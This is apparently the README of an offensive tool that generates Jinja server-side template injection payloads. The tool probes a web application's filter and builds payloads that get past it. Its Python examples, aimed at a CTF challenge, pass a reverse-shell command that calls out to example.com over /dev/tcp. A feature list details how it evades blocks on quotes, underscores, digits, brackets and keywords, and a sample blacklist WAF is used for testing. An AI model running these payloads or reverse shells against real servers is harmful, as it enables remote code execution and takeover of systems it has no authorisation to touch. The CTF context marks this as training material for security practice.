![](./fenjing.webp)

> Bypassing the WAF without knowing WAF

## 介绍

焚靖是一个针对Jinja SSTI的Payload生成器，支持自动检测WAF并尝试绕过

## 使用

示例：[CTFShow]web372

首先写一个函数，这个函数接受一个字符串，如果这个字符串包含会被WAF的字符，则返回False，否则返回True

```python
@functools.lru_cache
def waf(s: str):

    time.sleep(0.1)
    r = requests.get(url, params = {
        "name": s
    })

    return r.text != ":("
```

然后将这个函数和你要运行的shell命令传给模块，即可生成payload

```python
payload = shell_cmd(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3003 0>&1\"")
```

完整示例：

```python
from ssti import shell_cmd

import functools
import time
import requests
import logging

logging.basicConfig(level = logging.WARNING)

# ctf.show web372
url = "http://ddde51f2-ff61-4f88-a9a7-3af3654a76b8.challenge.ctf.show/"

@functools.lru_cache
def waf(s: str):
    time.sleep(0.1)
    r = requests.get(url, params = {
        "name": s
    })

    return r.text != ":("

payload = shell_cmd(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")

r = requests.get(url, params = {
    "name": payload
})

print(r.text)
```

## 特性

支持绕过：

- `'`和`"`
- 绝大多数敏感关键字
- 任意阿拉伯数字
- `_`
- `[`
- `+`
- `-`
- `~`
- `{{`

### 自然数绕过：

支持绕过0-9的同时绕过加号或减号

支持全角数字和特定数字相加减两种绕过方式

### `'%c'`绕过:

支持绕过引号，`g`和`lipsum`

### 下划线绕过：

支持`(lipsum|escape|batch(22)|list|first|last)`
- 其中的数字22支持上面的数字绕过

### 任意字符串：

支持绕过引号，任意字符串拼接符号，下划线和任意关键词

支持以下形式

- `'str'`
- `"str"`
- `"\x61\x61\x61"`
- `dict(__class__=cycler)|join`
    - 其中的下划线支持绕过
- `'%c'*3%(97,97, 97)`
    - 其中的`'%c'`也支持上面的`'%c'`绕过
    - 其中的所有数字都支持上面的数字绕过

### 属性：

- `['aaa']`
    - 其中的字符串支持上面的任意字符串绕过
- `.aaa`
- `|attr('aaa')`
    - 其中的字符串也支持上面的任意字符串绕过

### Item

- `['aaa']`
    - 其中的字符串支持上面的任意字符串绕过
- `.aaa`
- `.__getitem__('aaa')`
    - 其中的`__getitem__`支持上面的属性绕过
    - 其中的字符串也支持上面的任意字符串绕过


### 测试绕过：

```python
from ssti import shell_cmd
import logging

logging.basicConfig(level = logging.WARNING)

def waf(s: str):
    blacklist = [
        "config", "self", "g", "os", "class", "length", "mro", "base", "request", "lipsum",
        "[", '"', "'", "_", ".", "+", "~", "{{",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
        "０","１","２","３","４","５","６","７","８","９"
    ]

    for word in blacklist:
        if word in s:
            return False
    return True

payload = shell_cmd(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")

print(payload)
```
